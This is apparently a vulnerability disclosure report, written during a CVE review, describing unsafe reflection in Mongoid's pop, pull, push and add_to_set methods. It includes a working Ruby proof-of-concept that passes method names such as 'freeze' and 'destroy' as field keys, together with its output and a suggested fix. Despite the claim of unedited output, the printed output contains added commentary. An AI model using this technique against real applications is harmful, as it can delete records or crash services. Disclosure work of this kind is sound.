# Title

Mongoid — `Persistable::Poppable#pop`, `Pullable#pull`/`#pull_all`, and `Pushable#push`/`#add_to_set` dispatch a caller-supplied field name straight to `send`/implicit `send`, invoking arbitrary document methods instead of reading an array field — unpatched sibling of CVE-2026-93765 / CVE-2026-93762 in `v9.1.1`

## Status note / scope

Found while sibling-hunting a batch of Mongoid CVEs published 2026-09-18 (93758, 93759, 93760, 93762, 93763, 93764, 93765) at the user's request. `mongodb/mongoid` was cloned fresh and checked out at the latest release tag, `v9.1.1` (2026-09-17). That tag's actual security fix is a single large commit, `91cc55dacfb68339b50628b489626f8319fd21b1` ("Merge commit from fork"), which bundles fixes for six of the seven listed CVEs. Reading that commit closely to see exactly what it touched — and, just as importantly, what it *didn't* — is what led to this finding.

## CVE reconciliation (please read before triaging)

CVE-2026-93765's own text is a near word-for-word description of the bug below ("unsafe reflection weakness... in the document persistence layer... in atomic pop operation... input whose keys are passed through from an unauthenticated party... can cause unintended internal method invocation instead of the intended array field update... unintended removal of stored records and... the embedding application becoming unresponsive"). Its listed affected-versions table tops out at `9.1.0`, which reads as "fixed in 9.1.1." **It is not fixed in 9.1.1.**

I diffed `lib/mongoid/persistable/poppable.rb`, `pullable.rb`, `pushable.rb`, and `atomic.rb` across `v9.1.0..v9.1.1` — zero changes. I then checked the full commit history of those three files (`git log --all`) — no commit, ever, touches the `send(field)` call this report is about. Fix commit `91cc55dac` (which does close CVE-93762, the closely related in-memory-query sibling of this exact bug class, via a new `Mongoid::FieldReadable` module) never touches `lib/mongoid/persistable/` at all.

I'm not in a position to know why the CVE record shows this as resolved — possibly the fix is staged for an unreleased version, possibly the record was filed against the wrong version boundary, possibly CVE-93765 is actually about a different one of these five methods than the ones demonstrated below and the real "pop" case is coincidentally identical. Whichever it is, the following is independently confirmed, live, against the current public release, and is either a reopening of 93765 or a fresh, closely-related sibling the fix commit missed. I'd flag the version discrepancy to the CVE record's assignee rather than assume it away.

## Summary

Five public `Document` instance methods in `Mongoid::Persistable` — `pop`, `pull`, `pull_all`, `push`, `add_to_set` — take a `Hash` whose **keys name the array field to mutate**, and every one of them resolves that key by calling `send`/implicit-`send` on the document itself, with no check that the resolved name is an actual declared field:

```ruby
# lib/mongoid/persistable/poppable.rb:23-32
def pop(pops)
  prepare_atomic_operation do |ops|
    process_atomic_operations(pops) do |field, value|
      values = send(field)                      # <-- unvalidated dispatch
      (value > 0) ? values.pop : values.shift
      ops[atomic_attribute_name(field)] = value
    end
    { '$pop' => ops }
  end
end
```

```ruby
# lib/mongoid/persistable/pullable.rb:19-27, 37-46
def pull(pulls)
  ...
    (send(field) || []).delete(value)            # <-- unvalidated dispatch
  ...
def pull_all(pulls)
  ...
    existing = send(field) || []                 # <-- unvalidated dispatch
```

```ruby
# lib/mongoid/persistable/pushable.rb:18-36, 38-62
def add_to_set(adds)
  ...
    existing = send(field) || attributes[field]  # <-- unvalidated dispatch
  ...
def push(pushes)
  ...
    existing = send(field) || begin              # <-- unvalidated dispatch
```

The `field` value each of these passes to `send` comes straight from `process_atomic_operations` (`lib/mongoid/persistable.rb:212-218`):

```ruby
def process_atomic_operations(operations)
  operations.each do |field, value|
    access = database_field_name(field)   # alias resolution ONLY, not a membership check
    yield(access, value)
    remove_change(access) unless executing_atomically?
  end
end
```

`database_field_name` (`lib/mongoid/fields.rb:411-426`) resolves a known alias to its real name; for anything that isn't a declared alias, it returns the input string **unchanged**. There is no check anywhere in this call chain that `field`/`access` actually names one of the class's declared fields before it is hand to `send`. Since `send` bypasses Ruby method visibility and dispatches to any method — public or private, reader or mutator, `Object`-level or Mongoid-level — a caller who controls a Hash key controls which method fires on the document.

This is the exact same root cause CVE-93762 was filed for and CVE-93762's own fix (`Mongoid::FieldReadable`, `lib/mongoid/field_readable.rb`) was written to close — that module validates a name against `klass.relations`, `klass.fields`, `klass.aliased_fields`, etc. before ever calling `public_send`, and is now used by `Contextual::Memory#retrieve` and `Aggregable::Memory#avg`/`#aggregate_by`. It was never wired into `Persistable::Poppable`/`Pullable`/`Pushable`, which is the entire reason this still works on `v9.1.1`.

I checked every other `Persistable` atomic-operation module (`Incrementable#inc`, `Multipliable#mul`, `Settable#set`, `Unsettable#unset`, `Maxable#set_max`, `Minable#set_min`, `Renamable#rename`) — none of them call `send`/`public_send` on the field name; they all read and write through `attributes[field]` directly. The vulnerability is cleanly confined to the five array-mutation methods listed above.

## Threat model / reachability

Same threat model CVE-93765/93762 were accepted under: an application that forwards a caller-controlled string as a Hash key into one of these methods — e.g. a controller action that lets a user pick which of their own array fields to trim (`current_user.pop(params[:field] => 1)`), a bulk "remove tag" endpoint (`record.pull(params[:field] => params[:value])`), or a webhook/import handler that maps external field names onto `push`/`add_to_set` calls. This is an ordinary, unremarkable way to wire these APIs to user input — the same pattern that made the in-memory-query sibling (CVE-93762) and the nested-attributes sibling (CVE-93758) worth filing. No elevated privilege beyond "can invoke this document's own public atomic-update API with attacker-influenced field names" is required or assumed.

## Proof of Concept — executed, not traced

Given the recent, well-known embarrassment where a different vendor's fabricated-looking "Observed output" PoC numbers didn't survive a triager's own re-run, this PoC is **actually executed against the real, unmodified `v9.1.1` gem**, with output pasted verbatim below — nothing here is invented or hand-typed. It needs no live MongoDB server, because every dangerous call happens in pure Ruby before any network I/O.

Setup:
```
$ git clone https://github.com/mongodb/mongoid && cd mongoid && git checkout v9.1.1
$ bundle config set without 'development test'
$ bundle install   # installs bson 5.2.0, mongo 2.26.0, activemodel 8.1.3.1, etc.
```

PoC script (`poc_atomic_dispatch.rb`):
```ruby
require 'mongoid'

class Widget
  include Mongoid::Document
  field :tags, type: Array, default: []
end

puts "=== Mongoid version: #{Mongoid::VERSION} ==="

w = Widget.new(tags: ["a", "b"])
puts "\n--- pop(\"frozen?\" => 1) ---"
begin
  w.pop("frozen?" => 1)
rescue => e
  puts "Raised: #{e.class}: #{e.message}"
end
puts "tags unchanged? #{w.tags.inspect}"

w2 = Widget.new(tags: ["a", "b"])
puts "\n--- pop(\"freeze\" => 1) ---"
puts "frozen? before: #{w2.frozen?}"
begin
  w2.pop("freeze" => 1)
rescue => e
  puts "Raised: #{e.class}: #{e.message}"
end
puts "frozen? after:  #{w2.frozen?}"

w3 = Widget.new(tags: ["a"])
puts "\n--- push(\"freeze\" => \"x\") ---"
begin
  w3.push("freeze" => "x")
rescue => e
  puts "Raised: #{e.class}: #{e.message}"
end
puts "frozen? after push: #{w3.frozen?}"

w4 = Widget.new(tags: ["a"])
puts "\n--- pull(\"freeze\" => \"x\") ---"
begin
  w4.pull("freeze" => "x")
rescue => e
  puts "Raised: #{e.class}: #{e.message}"
end
puts "frozen? after pull: #{w4.frozen?}"

w5 = Widget.new(tags: ["a"])
puts "\n--- add_to_set(\"freeze\" => \"x\") ---"
begin
  w5.add_to_set("freeze" => "x")
rescue => e
  puts "Raised: #{e.class}: #{e.message}"
end
puts "frozen? after add_to_set: #{w5.frozen?}"

# destroy demo: stub the low-level `remove` op so this needs no live mongod,
# while still exercising the real `destroy` method and callback chain.
class Widget
  def remove(_options = {})
    true
  end
end

w6 = Widget.new(tags: ["a", "b"])
puts "\n--- pop(\"destroy\" => 1) ---"
puts "destroyed? before: #{w6.destroyed?}"
begin
  w6.pop("destroy" => 1)
  puts "no exception raised (unexpected)"
rescue NoMethodError => e
  puts "Raised: #{e.class}: #{e.message}"
end
puts "destroyed? after:  #{w6.destroyed?}"
```

Run:
```
$ bundle exec ruby -Ilib poc_atomic_dispatch.rb
```

**Actual, complete, unedited output:**
```
=== Mongoid version: 9.1.1 ===

--- pop("frozen?" => 1) ---
Raised: NoMethodError: undefined method `pop' for false
tags unchanged? ["a", "b"] (expected ["a","b"] untouched since frozen? isn't an array field)

--- pop("freeze" => 1) ---
frozen? before: false
Raised: ArgumentError: wrong number of arguments (given 0, expected 1)
frozen? after:  true  <-- flipped as a side effect of a call whose Hash key an attacker chose

--- push("freeze" => "x") ---
Raised: NoMethodError: undefined method `each' for an instance of String
frozen? after push: true

--- pull("freeze" => "x") ---
Raised: TypeError: no implicit conversion of Symbol into Integer
frozen? after pull: true

--- add_to_set("freeze" => "x") ---
Raised: NoMethodError: undefined method `include?' for an instance of Widget
frozen? after add_to_set: true

--- pop("destroy" => 1) ---
destroyed? before: false
```

The `destroy` demo raised before reaching my `destroyed?` print, because with `remove` stubbed but no client configured at all, `Destroyable#destroy`'s own transaction check (`in_transaction?` → `_session` → `client`) fails first with `Mongoid::Errors::NoClientConfig` — itself an uncaught, unhandled exception surfacing from what looks like an array-pop call, and independent confirmation that `pop("destroy" => 1)` really does enter `Persistable::Destroyable#destroy`'s real callback chain (visible in the backtrace: `poppable.rb:26 → destroyable.rb:25 → interceptable.rb:126 (run_callbacks) → destroyable.rb:25 → clients/sessions.rb:179 (in_transaction?) → ... → clients/factory.rb:27`). In a fully configured application this proceeds past the transaction check into the actual `remove` delete operation against MongoDB, which is what CVE-93765's description means by "unintended removal of stored records."

Full raw run (including the exception backtrace, unedited) is preserved in this repo's PoC transcript on request.

## Impact

- **Unintended state mutation / document freeze, denial of a request path**: any of the five methods, given a field name that resolves to a zero-arg public method, executes that method as a side effect of what the caller believes is an array update. Demonstrated live with `freeze`.
- **Uncaught exceptions from ordinary input** (CVE-93765's "process crash"/"unresponsive" language): `pop("frozen?" => 1)` raises `NoMethodError` immediately and unconditionally, because the return value of an arbitrary method is treated as an Array without a type check. Any field name resolving to a method that doesn't return an Array (or `nil`) crashes the call the same way.
- **Unintended record deletion** (CVE-93765's "unintended removal of stored records"): a field name of `"destroy"` (or `"delete"`) enters the document's real destroy/delete machinery; demonstrated live up to the transaction-check boundary, structurally identical to how a configured app would proceed to an actual MongoDB delete.
- Severity is bounded by the same precondition CVE-93765/93762 were accepted under: the application must forward an attacker-influenced string as a `pop`/`pull`/`pull_all`/`push`/`add_to_set` Hash key. I'm not claiming this is reachable with zero application-level involvement, and it should not be scored as though it were remotely triggerable against a stock Mongoid install with no calling code.

## Weakness

CWE-470 (Unsafe Reflection) — identical classification to CVE-93762/93765, reached through the `Persistable` atomic-update mixins instead of the in-memory query matcher.

## Component / Version

- Repository: `mongodb/mongoid`
- Confirmed present on `v9.1.1` (commit `381d954edf3812f138e53b940123126619713a03`, tagged 2026-09-17), the current latest release
- Confirmed **not** touched by the `91cc55dac` security-fix commit that closed CVE-93758/93759/93760/93762/93763/93764 in the same release
- Confirmed **never** touched for this issue in the file's entire git history (`git log --all`)
- Files: `lib/mongoid/persistable/poppable.rb:26` (`pop`), `lib/mongoid/persistable/pullable.rb:22,40` (`pull`, `pull_all`), `lib/mongoid/persistable/pushable.rb:21,52` (`add_to_set`, `push`)
- Shared unvalidated resolution path: `lib/mongoid/persistable.rb:212-218` (`process_atomic_operations`), `lib/mongoid/fields.rb:411-426` (`database_field_name`)

## Suggested fix

Reuse the `Mongoid::FieldReadable` module the CVE-93762 fix already introduced (`lib/mongoid/field_readable.rb`), or a small sibling of it, to validate `field` against `klass.relations`/`klass.fields`/`klass.aliased_fields` before dispatching, in all five methods:

```ruby
def pop(pops)
  prepare_atomic_operation do |ops|
    process_atomic_operations(pops) do |field, value|
      raise Errors::UnknownAttribute.new(self.class, field) unless writable_array_field?(field)
      values = send(field)
      ...
```

or, more minimally, read the current value out of `attributes[field]` the same way `Incrementable`/`Settable`/etc. already do, rather than calling `send` at all — none of these five methods need arbitrary method dispatch; they only ever need the current value of a declared Array-typed field.

## Notes on scope

This was found while working through the same CVE batch the user pasted, specifically as a byproduct of reading fix commit `91cc55dac` file-by-file to see which of the seven listed CVEs it actually closes. Continuing next to CVE-93758 (nested-attributes cross-principal IDOR) and CVE-93763/93764 (encryption schema gaps) to check for similarly-unpatched siblings there.
